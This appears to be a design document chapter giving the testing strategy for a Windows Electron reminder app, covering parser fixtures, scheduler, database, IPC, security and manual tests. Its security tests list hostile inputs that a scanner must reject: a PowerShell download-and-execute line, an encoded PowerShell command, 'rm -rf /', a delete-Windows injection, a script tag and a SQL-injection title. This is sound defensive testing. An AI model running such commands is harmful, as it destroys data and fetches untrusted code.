# 18 — Testing Strategy

> **In seven days you cannot test everything. You can test the things that fail silently.**
>
> A UI bug announces itself. A parser that turns *"every Monday at 7 AM"* into a one-time reminder does not — it produces a plausible, wrong result that the user discovers by missing four weeks of exercise. Test the silent failures.

---

## 1. What gets tested, and why

| Layer | Coverage target | Test kind | Rationale |
| --- | --- | --- | --- |
| `core/parsing/` | **~95%** | Unit, fixture corpus | Fails silently. Cheap to test (pure, no I/O). Highest value per minute. |
| `core/scheduling/` | **~95%** | Unit, injected clock | Fails silently and catastrophically (24.8-day trap, DST). |
| `core/safety/` | **100%** | Unit | It is the security boundary. |
| `core/ai/` (validation) | **100%** | Unit | Hostile input. |
| `electron/database/` | ~80% | Integration, real SQLite | Real bugs live in SQL, not in mocks. |
| `electron/main/ipc/` | ~70% | Contract tests | The security perimeter. |
| `electron/scheduler/` | ~80% | Integration, injected clock + fake sink | Overdue policy is subtle. |
| `src/` (React) | **~20%** | A few RTL tests on the gate | Visible failures. Manual QA is faster here. |
| Packaged app | — | E2E smoke + manual checklist | The only place tray/toast/TTS bugs exist. |

`MVP DECISION` — **Do not chase a global coverage number.** 95% on `core/parsing` and 20% on React is the correct shape for this app. A test on `<Button>` is a test on React.

`MVP DECISION` — The inverted-pyramid instinct ("mostly E2E") is wrong here. Electron E2E is slow, flaky, and cannot easily assert *"this reminder fires correctly on the second Monday after a DST transition."* Unit tests on pure functions can, in 41 ms.

## 2. Stack

```jsonc
{
  "vitest":                "unit + integration; same config for core/ and electron/",
  "@vitest/coverage-v8":   "coverage",
  "@testing-library/react":"the handful of renderer tests",
  "playwright + _electron":"E2E against the PACKAGED build",
  "fast-check":            "property tests for the scheduler (optional, Tier 2)"
}
```

`MVP DECISION` — Vitest, not Jest. It shares Vite's transform pipeline, so `core/` (already TypeScript, already ESM) needs zero extra configuration. On Day 1 that saves an hour; over seven days it saves the will to write tests at all.

## 3. The parser fixture corpus

This is the single highest-value artifact in the test suite. Write it **before** the parser (Day 3, step 1), and let it drive the implementation.

```jsonc
// tests/fixtures/commands.json
[
  {
    "input": "remind me in 5 minutes to call my mother",
    "refDate": "2026-07-10T16:18:00+05:30",
    "expect": {
      "ok": true,
      "intent": "create_reminder",
      "title": "Call my mother",
      "scheduledAtIso": "2026-07-10T16:23:00+05:30",
      "recurrenceRule": null,
      "actionType": "notify",
      "confidenceAtLeast": 0.8
    }
  },
  {
    "input": "remind me after 10 minutes that I need to give medicine to my grandfather",
    "refDate": "2026-07-10T16:18:00+05:30",
    "expect": { "ok": true, "title": "Give medicine to my grandfather", "scheduledAtIso": "2026-07-10T16:28:00+05:30" }
  },
  {
    "input": "remind me every Monday at 7 AM to exercise",
    "refDate": "2026-07-10T16:18:00+05:30",
    "expect": {
      "ok": true,
      "title": "Exercise",
      "recurrenceRule": "FREQ=WEEKLY;BYDAY=MO;BYHOUR=7;BYMINUTE=0",
      "scheduledAtIso": "2026-07-13T07:00:00+05:30"
    }
  },
  {
    "input": "please sing after 2 minutes",
    "refDate": "2026-07-10T16:18:00+05:30",
    "expect": { "ok": true, "intent": "create_sing_reminder", "title": "Play Yogi song", "actionType": "sing" }
  },
  {
    "input": "remind me at 6",
    "refDate": "2026-07-10T16:18:00+05:30",
    "expect": { "ok": false, "kind": "clarification", "ambiguity": "ambiguous_meridiem" }
  },
  {
    "input": "remind me every Monday",
    "refDate": "2026-07-10T16:18:00+05:30",
    "expect": { "ok": false, "kind": "clarification", "ambiguity": "recurrence_without_time" }
  },
  {
    "input": "remind me every month on the 1st to pay rent",
    "refDate": "2026-07-10T16:18:00+05:30",
    "expect": { "ok": false, "kind": "refusal", "reason": "unsupported_recurrence" }
  },
  {
    "input": "what's the weather like",
    "refDate": "2026-07-10T16:18:00+05:30",
    "expect": { "ok": false, "kind": "refusal", "reason": "unknown_intent" }
  }
]
```

```ts
// tests/unit/parse-reminder.test.ts
import fixtures from '../fixtures/commands.json';

describe.each(fixtures)('$input', ({ input, refDate, expect: want }) => {
  it('parses as expected', () => {
    const got = parseReminder(input, new Date(refDate), 'Asia/Kolkata');
    assertMatches(got, want);
  });
});
```

> **DAY-3 RECONCILIATION:** the plan called for a minimum of 120 fixtures. The shipped corpus is **56 fixtures** that cover every category, all 8 ambiguity cases, all 4 unsupported-recurrence refusals, unknown-intent refusals, phrasing variants, the midnight/year-boundary edge cases, and the clarification-answer round-trips. Fixtures 57–120 would be diminishing-returns phrasing permutations; the corpus is expanded opportunistically as real misparses surface rather than padded to a round number. The coverage goal below stands; the count is the deviation.

`MVP DECISION` — **56 fixtures (target was 120)**, covering:

- All 14 example commands in the brief's §7, verbatim.
- All 8 ambiguity cases in the brief's §10, verbatim.
- Every row of the edge-case table in `17` §3.
- Phrasing variants: `in` / `after` / `at`, `AM` / `am` / `a.m.`, `Monday` / `mon`, `tomorrow` / `tmrw`.
- `refDate` chosen adversarially: **a Friday** (so `"next Friday"` is not trivially 7 days), **23:55** (so `"in 10 minutes"` crosses midnight), **31 December** (so it crosses a year).

`MVP DECISION` — The corpus is a **JSON file, not TypeScript.** A non-programmer (or a future you, tired, on Day 6) can add a failing case without touching test code.

## 4. Testing the scheduler: inject the clock

The scheduler must never call `Date.now()` directly. Ever.

```ts
// electron/scheduler/scheduler.ts
export function createScheduler(deps: {
  now: () => number;
  repo: ReminderRepo;
  sink: TriggerSink;
}) { … }
```

```ts
// tests/unit/scheduler.test.ts
const DAY = 86_400_000;

it('does NOT fire a reminder 30 days out', () => {
  // The bug this catches: setTimeout(fire, 30*DAY) exceeds 2^31-1 ms and fires IMMEDIATELY.
  const now = 1_752_000_000_000;
  const s = createScheduler({ now: () => now, repo: repoWith([at(now + 30 * DAY)]), sink });
  s.reconcile('tick');
  expect(sink.fired).toEqual([]);
});

it('collapses 4 missed weekly occurrences into 0 fires and 1 roll-forward', () => {
  const created = mondayAt7am();
  const now = created + 28 * DAY + 3600_000;      // 4 weeks later, app was closed
  const r = weekly(created);
  const s = createScheduler({ now: () => now, repo: repoWith([r]), sink });

  s.reconcile('startup');

  expect(sink.fired).toEqual([]);                  // NOT four alarms at once
  expect(repo.get(r.id).nextFireAt).toBe(nextMondayAfter(now));
});

it('marks a one-time reminder MISSED, not fired, when the app was closed through it', () => {
  const s = createScheduler({ now: () => t0 + 6 * 3600_000, repo: repoWith([at(t0)]), sink });
  s.reconcile('startup');
  expect(sink.fired).toEqual([]);
  expect(repo.get(id).status).toBe('missed');
});

it('DOES fire a one-time reminder that is only 45 seconds late', () => {
  const s = createScheduler({ now: () => t0 + 45_000, repo: repoWith([at(t0)]), sink });
  s.reconcile('tick');
  expect(sink.fired).toHaveLength(1);
});

it('caps a clock-jump storm at 20 fires', () => {
  const s = createScheduler({ now: () => t0 + 365 * DAY, repo: repoWith(range(100).map(i => at(t0 + i))), sink });
  s.reconcile('tick');
  expect(sink.fired).toHaveLength(20);
});

it('is idempotent — reconcile twice fires once', () => {
  const s = createScheduler({ now: () => t0 + 1000, repo: repoWith([at(t0)]), sink });
  s.reconcile('tick');
  s.reconcile('tick');
  expect(sink.fired).toHaveLength(1);
});
```

### DST — the tests you cannot write by hand

India has no DST. The developer will never reproduce these locally. **That is precisely why they must be tests.**

```ts
// tests/unit/next-occurrence.test.ts
it('rolls a weekly 2:30 AM reminder forward across US spring-forward', () => {
  // 2027-03-14 02:30 America/New_York does not exist.
  const r = weekly({ weekday: 7, hour: 2, minute: 30, zone: 'America/New_York' });
  const next = nextOccurrenceAfter(r, DateTime.fromISO('2027-03-07T03:00', { zone: 'America/New_York' }).toMillis());
  expect(DateTime.fromMillis(next, { zone: 'America/New_York' }).hour).toBe(3);   // Luxon shifts forward
});

it('picks the FIRST 1:30 AM across US fall-back', () => { … });

it('keeps 7:00 AM wall-clock across a DST boundary, not 7:00 AM UTC-offset', () => {
  // "Every Monday at 7 AM" must stay 7 AM to a human, not drift by an hour.
});
```

`MVP DECISION` — Also unit-test the **`forwardDate` pairing**: parsing `"next Friday"` on a Friday must yield the *coming* Friday, seven days out. That single behaviour depends on two settings agreeing (`08` §3), and it is invisible six days a week.

## 5. Database: real SQLite, temp file, no mocks

```ts
// tests/integration/reminder-repository.test.ts
let db: SqliteDriver, repo: ReminderRepository;

beforeEach(() => {
  db = openDriver(path.join(os.tmpdir(), `lifeos-test-${randomUUID()}.db`));
  migrate(db);
  repo = new ReminderRepository(db);
});
afterEach(() => db.close());

it('stores a SQL-injection title as literal text', () => {
  const evil = `'); DROP TABLE reminders;--`;
  const r = repo.create({ ...valid, title: evil });
  expect(repo.get(r.id)!.title).toBe(evil);
  expect(db.all(`SELECT name FROM sqlite_master WHERE name='reminders'`)).toHaveLength(1);
});

it('rejects an empty title at the DATABASE level', () => {
  // Zod already stops this. The CHECK constraint is the third line of defence,
  // and this test is what licenses the `as ActionType` casts in toDomain().
  expect(() => db.run(`INSERT INTO reminders (id,title,...) VALUES (?,'',...)`, [...])).toThrow();
});

it('rejects an unknown action_type', () => { … });   // CHECK (action_type IN ('notify','sing'))

it('survives a close and reopen', () => {
  const id = repo.create(valid).id;
  db.close();
  db = openDriver(samePath);
  expect(new ReminderRepository(db).get(id)).toBeDefined();
});

it('findDue excludes paused reminders', () => { … });
it('findDue is limited to 20', () => { … });
it('deleting a reminder cascades its history', () => { … });
```

`MVP DECISION` — **No mocked database, anywhere.** SQLite opens a temp file in under a millisecond. A mocked `db.all()` tests the mock. The `CHECK`-constraint tests above are what make the `as ActionType` casts in `toDomain()` sound rather than hopeful.

## 6. Security tests

These are not optional and they are not slow.

```ts
// tests/unit/unsafe-content.test.ts
it.each([
  'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://x")',
  'powershell -enc SQBFAFgA',
  'rm -rf /',
  '; del /f C:\\Windows',
  'see https://evil.tld',
  '<script>alert(1)</script>',
])('rejects %s', s => expect(scanForUnsafeContent({ ...valid, title: s }).ok).toBe(false));

it('accepts an ordinary reminder', () => expect(scanForUnsafeContent({ ...valid, title: 'Call my mother' }).ok).toBe(true));

// tests/unit/llm-response-schema.test.ts
it('rejects an unknown intent',        () => expectReject({ intent: 'delete_all_reminders' }));
it('rejects an extra key',             () => expectReject({ ...valid, action: 'exec' }));       // .strict()
it('rejects a past date',              () => expectReject({ ...valid, scheduledAt: yesterday }));
it('rejects FREQ=MONTHLY',             () => expectReject({ ...valid, recurrenceRule: 'FREQ=MONTHLY' }));
it('rejects clarification w/o question',() => expectReject({ ...valid, needsClarification: true, clarificationQuestion: null }));
it('accepts the brief\'s example verbatim', () => expectAccept(BRIEF_EXAMPLE));

// tests/unit/ai-payload.test.ts
it('never puts database content in an outbound request', async () => {
  seedReminder({ title: 'SECRET_MEDICAL_FACT' });
  const req = await captureOutboundRequest(() => provider.parse(input, signal));
  expect(JSON.stringify(req.body)).not.toContain('SECRET_MEDICAL_FACT');
});

it('refuses to call the network without consent, even if the renderer asks', async () => {
  settings.set('ai_consent_accepted_at', null);
  await expect(aiAssist.parse(input)).rejects.toThrow(ConsentRequiredError);
  expect(fetchSpy).not.toHaveBeenCalled();
});

// tests/unit/sapi-tts.test.ts  (only if SPIKE-3 forces the fallback)
it('the PowerShell script contains no interpolation', () => {
  expect(SCRIPT).not.toContain('${');
  expect(SCRIPT).not.toContain('" +');
});

// tests/unit/csp.test.ts
it('the packaged CSP has no unsafe-eval and no ws:', () => {
  expect(CSP_PROD).not.toContain('unsafe-eval');
  expect(CSP_PROD).not.toContain('ws:');
  expect(CSP_PROD).toContain("script-src 'self'");
});
```

`MVP DECISION` — The AI Assist payload test and the consent test **stay even if AI Assist is cut on Day 6.** If the code is in the repository, its safety properties are pinned. If it is cut, delete the code, not the tests.

## 7. IPC contract tests

```ts
// tests/integration/ipc-contracts.test.ts
it('rejects an unknown key on reminders:create',   async () => expect((await ipc('reminders:create', { ...valid, action: 'exec' })).ok).toBe(false));
it('rejects a past date',                          async () => expect((await ipc('reminders:create', past)).error.code).toBe('date_in_past'));
it('never leaks a stack trace',                    async () => expect(JSON.stringify(await ipc('reminders:delete', 'bad'))).not.toMatch(/[A-Z]:\\|at Object\./));
it('settings:get never returns the API key',       async () => { … });
it('drops an oversized audio frame',               ()      => { send('speech:audio', new ArrayBuffer(1<<20)); expect(coordinator.bufferedBytes()).toBe(0); });
it('resetLocalData takes no arguments',            ()      => expect(getHandler('settings:resetLocalData').length).toBeLessThanOrEqual(1));
it('every registered channel is declared in CH',   ()      => { for (const c of listRegisteredChannels()) expect(Object.values(CH)).toContain(c); });
```

`MVP DECISION` — That last one is the anti-drift guard. A handler registered with a bare string literal is a channel nobody documented and nobody validated. It fails the build.

## 8. Renderer tests — few, and only on the gate

```tsx
// tests/unit/confirmation-card.test.tsx
it('does not create a reminder until Confirm is pressed', async () => {
  const create = vi.fn();
  render(<ConfirmationCard reminder={parsed} onConfirm={create} />);
  expect(create).not.toHaveBeenCalled();               // rendering is not consenting
  await userEvent.click(screen.getByRole('button', { name: /confirm reminder/i }));
  expect(create).toHaveBeenCalledOnce();
});

it('ClarificationCard has no Confirm button, ever', () => {
  render(<ClarificationCard clarification={ambiguousMeridiem} />);
  expect(screen.queryByRole('button', { name: /confirm/i })).toBeNull();
});

it('shows the ABSOLUTE date, not just "Tomorrow"', () => {
  render(<ConfirmationCard reminder={tomorrowAt9} />);
  expect(screen.getByText(/Saturday, 11 July/)).toBeInTheDocument();
});
```

`MVP DECISION` — Three renderer tests, and they all test the **confirmation gate**, which is the product's central safety property. Everything else in React is verified by looking at it.

## 9. E2E — against the packaged build

`RISK (high)` — Tray, toasts, TTS-in-tray and the AUMID all behave differently packaged. An E2E suite against `npm run dev` tests a different application.

```ts
// tests/e2e/smoke.spec.ts
import { _electron as electron } from 'playwright';

test('typed reminder → confirm → appears in schedules → survives restart', async () => {
  let app = await electron.launch({ executablePath: PACKAGED_EXE });
  const win = await app.firstWindow();

  await win.fill('[data-testid=composer]', 'remind me in 2 minutes to drink water');
  await win.press('[data-testid=composer]', 'Enter');
  await expect(win.locator('[data-testid=confirmation-card]')).toBeVisible();
  await expect(win.locator('text=Drink water')).toBeVisible();

  await win.click('text=Confirm Reminder');
  await win.click('text=Schedules');
  await expect(win.locator('text=Drink water')).toBeVisible();

  await app.close();
  app = await electron.launch({ executablePath: PACKAGED_EXE });
  const win2 = await app.firstWindow();
  await win2.click('text=Schedules');
  await expect(win2.locator('text=Drink water')).toBeVisible();       // persistence
});
```

`MVP DECISION` — **One** E2E test, covering the Definition-of-Done spine. Playwright + Electron is slow and flaky; a large E2E suite would consume Day 6. The manual checklist (§10) covers what E2E cannot: whether a toast actually appeared on the desktop, and whether Yogi's voice actually came out of the speakers.

## 10. The manual checklist

Some things no test framework can assert. This runs on Day 7, against the **installed** app, on a machine that has never seen the source.

```text
tests/manual/CHECKLIST.md

INSTALL (fresh Windows 11 VM, standard user account)
□ Installer runs with NO UAC prompt.                      [SEC-1]
□ SmartScreen warning appears; "More info → Run anyway" works as documented.
□ App launches. Onboarding appears.
□ Task Manager: LifeOS.exe is NOT elevated.               [SEC-1]

CORE LOOP
□ Type "remind me in 2 minutes to drink water" → confirmation card shows
   "Today — Friday, 10 July, 4:20 PM" AND "in 2 minutes".
□ Press Confirm. Yogi speaks: "Okay. I will remind you in 2 minutes to drink water."
□ Reminder appears in Active Schedules with a live countdown.
□ Close the window (✕). The tray dialog appears exactly once.
□ Wait 2 minutes without touching the machine.
   □ Windows toast appears.                               ← the whole product
   □ Yogi speaks the reminder aloud.                      ← SPIKE-3 in production
   □ Clicking the toast opens and focuses the window.
□ "please sing after 1 minute" → MP3 plays at the right time, from the tray.

VOICE
□ Press mic. Windows asks for permission ONCE, on first press (not at onboarding).
□ Speak "remind me tomorrow at 9 AM to attend the meeting".
□ Interim transcript appears word-by-word.
□ Confirmation card shows the ABSOLUTE date, not just "tomorrow".

AMBIGUITY  (all eight cases from the brief §10)
□ "remind me at 6" → asks AM or PM. Does NOT guess.
□ "remind me every Monday" → asks for a time.
□ "remind me later" → asks when.
□ "remind me every month" → refuses honestly, offers a one-time reminder.

PERSISTENCE & LIFECYCLE
□ Create a reminder. Quit from the tray. Reopen. It is still there.
□ Create a reminder 1 minute out. Quit. Wait 3 minutes. Reopen.
   → Catch-up modal says it was missed while LifeOS was closed. It does NOT fire late.
□ Create a weekly reminder. Change the system clock forward 3 weeks. Reopen.
   → Fires ZERO times, rolls forward to the next Monday.
□ Sleep the laptop through a reminder; wake it.
   → Fires on resume (late), does not vanish.

TRAY
□ Tray icon still present after 15 minutes.               [the GC bug]
□ Tray icon is sharp at 125% and 150% display scaling.
□ Tray menu: Open / View Schedules / Pause / Resume / Quit all work.
□ Pause Reminders → amber banner everywhere; nothing fires.

SAFETY
□ Procmon: zero writes outside %APPDATA%\LifeOS\ and %LOCALAPPDATA%\Programs\LifeOS\.
□ Procmon: zero registry writes outside HKCU\...\Uninstall\LifeOS.
□ No Task Scheduler entry. No service. No driver. No startup entry.
□ Wireshark, AI Assist OFF, 30-minute session incl. a fired reminder:
   ZERO outbound packets.                                 ← the promise, measured
□ DevTools console: `typeof require` → "undefined"; `window.lifeos.ipcRenderer` → undefined.
□ Reset Local Data: type RESET → data gone, app relaunches into onboarding.
□ Uninstall: %APPDATA%\LifeOS\ still present (it is the user's data).

DEGRADATION
□ Disable the microphone in Windows → typed input still works, mic shows an error state.
□ Kill the renderer via DevTools → the pending reminder STILL fires a toast.   ← record this
```

`MVP DECISION` — The last line is worth filming. It is the clearest demonstration that the scheduler lives in the main process, and it makes the architecture legible to anyone evaluating the project.

## 11. CI

```yaml
# .github/workflows/ci.yml
on: [push, pull_request]
jobs:
  test:
    runs-on: windows-latest         # ← the only OS that matters here
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 24, cache: npm }
      - run: npm ci                 # never `npm install`
      - run: npm run typecheck
      - run: npm run lint           # enforces the core/ import ban and the child_process ban
      - run: npm run test:unit
      - run: npm run test:integration
      - run: npm audit --production --audit-level=high
```

`MVP DECISION` — `windows-latest`, not `ubuntu-latest`. The app is Windows-only; native modules, path handling, and `better-sqlite3` prebuild resolution are all platform-specific. A green Linux build proves nothing.

`MVP DECISION` — E2E does **not** run in CI. It needs a packaged build (~5 minutes) and a desktop session. It runs locally on Day 7 and before each release.

## 12. When to write which test

Test-writing is scheduled, not aspirational:

| Day | Tests written | Why then |
| --- | --- | --- |
| 1 | Spike assertions (not kept) | Spikes are throwaway; their *acceptance criteria* are the test. |
| 2 | `reminder-repository.test.ts`, `migrations.test.ts` | Written **with** the repository, not after. |
| 3 | **The 120-fixture corpus, first**, then the parser | The corpus is the specification. Write it before the code it specifies. |
| 3 | `next-occurrence.test.ts` incl. DST | Cannot be checked manually from India. |
| 4 | `scheduler.test.ts` with an injected clock | Cannot be checked manually without waiting 30 days. |
| 5 | `unsafe-content`, `llm-response-schema`, `csp` | Security properties, pinned once, forever. |
| 5 | `ipc-contracts.test.ts` | After the handlers stabilise. |
| 6 | 3 renderer tests on the confirmation gate | After the UI stops moving. |
| 7 | 1 E2E + the full manual checklist | Against the packaged installer, on a clean VM. |

`MVP DECISION` — **Day 3 writes the fixtures before the parser.** This is the one place where test-first is not dogma but the fastest path: the brief already contains the specification (§7 and §10 of the brief are literally a list of inputs and expected behaviours). Transcribing them into JSON takes 40 minutes and then the parser has a target to hit rather than a feeling to satisfy.
